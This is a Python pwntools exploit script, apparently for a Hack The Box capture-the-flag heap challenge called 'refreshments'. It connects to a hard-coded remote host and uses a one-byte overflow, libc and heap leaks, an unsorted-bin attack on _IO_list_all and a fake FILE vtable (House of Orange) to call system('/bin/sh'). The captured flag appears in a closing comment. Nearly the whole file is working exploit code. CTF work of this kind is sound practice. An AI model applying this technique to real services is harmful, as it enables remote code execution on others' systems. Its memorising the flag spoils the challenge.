#!/usr/bin/env python3

from pwn import *

exe = ELF('./refreshments')
libc = ELF('./glibc/libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def malloc():
	sa(b">> ", b"1")

def free(idx):
	sa(b">> ", b"2")
	sa(b"empty: ", f"{idx}".encode())

def edit(idx, data):
	sa(b">> ", b"3")
	sa(b"customize: ", f"{idx}".encode())
	sa(b"drink: ", data)

def read(idx):
	sa(b">> ", b"4")
	sa(b"glass: ", f"{idx}".encode())


script = '''
# readnum
brva 0x1559 
'''

while(True):
	try:
		p = remote("83.136.253.59", 35720)
		#p = process('./refreshments')
		#p = gdb.debug('./refreshments', gdbscript = script)

		# set up chunk
		malloc()
		malloc()
		malloc()
		malloc()

		# modify chunk_1 size via one byte overflow
		edit(0, b"0" * 0x58 + p8(0xc1))

		# chunk_1 goes to unsorted bin
		free(1)

		# malloc chunk_4 so we have last remainder (chunk_1) split
		malloc()
		## now last remainder and chunk_2 are the same

		# leak libc
		read(2)
		rcu(b"content: ")
		libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x399b78
		lleak("libc", libc_base)

		# leak heap
		malloc()
		## chunk_5 and chunk_2 are the same 
		free(0)
		free(5)
		read(2)
		rcu("content: ")
		heap_base = u64(p.recv(6).ljust(8, b"\x00"))
		lleak("heap", heap_base)

		# return chunk_5 and chunk_0 from fastbin in order
		malloc()
		malloc()
		## chunk_6 is old chunk_5 (is the same with chunk_2)
		## chunk_7 is old chunk_0

		# malloc chunk_8 to place a vtable
		malloc()

		# change chunk_7 size
		edit(7, b"3" * 0x58 + p8(0xc1))
		free(4)

		# malloc chunk_9 so we have last remainder
		malloc()
		## chunk_9 is old chunk_4
		## now last remainder and chunk_2 are the same

		# make a fake file stream
		_IO_list_all = libc_base + libc.symbols['_IO_list_all']
		system = libc_base + libc.symbols['system']

		vtable = heap_base + 0xd0 + 8 * 24 - 0x18
		fakefp = p64(0) + p64(_IO_list_all - 0x10)
		fakefp += p64(1) + p64(2)

		# make a fake file stream
		edit(2, fakefp)

		# make a fake vtable
		vtable = heap_base + 0x190 - 0x18
		edit(8, p64(system) + p64(vtable))

		#debug()
		# edit size again, also prepare flags -> /bin/sh
		edit(9, b"2" * 0x50 + b"/bin/sh\x00" + p8(0xb1))

		# trigger house of orange
		malloc()

		sleep(2)
		sl(b"echo vanishing")
		rcu(b"vanishing")
		break
	except:
		try:
			p.close()
		except:
			pass

p.interactive()
#HTB{0ld_sch00l_t3chn1qu35_n3v3r_d13}

